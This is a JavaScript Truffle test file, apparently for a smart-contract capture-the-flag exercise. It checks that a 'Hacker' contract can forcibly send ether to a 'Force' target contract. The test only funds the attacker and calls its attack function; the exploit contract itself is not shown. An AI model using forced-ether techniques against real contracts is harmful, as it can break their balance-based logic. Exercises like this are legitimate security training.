const Hacker = artifacts.require("Hacker");
const Force = artifacts.require("Force");
const { expect } = require("chai");
const { BN } = require("@openzeppelin/test-helpers");
/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  it("should send ether forcibly", async function () {
    const hackerContract = await Hacker.deployed();
    const targetContract = await Force.deployed();

    // First, send some ether to hacker contract
    let result = await hackerContract.send(web3.utils.toWei("1", "wei"));
    expect(result.receipt.status).to.equal(true);
    let balance = await web3.eth.getBalance(hackerContract.address);
    expect(balance).to.be.bignumber.greaterThan(new BN(0));

    // Attack
    result = await hackerContract.attack(targetContract.address, { from: _hacker });
    expect(result.receipt.status).to.equal(true);

    // Check target's balance
    balance = await web3.eth.getBalance(targetContract.address);
    expect(balance).to.be.bignumber.greaterThan(new BN(0));
  });
});
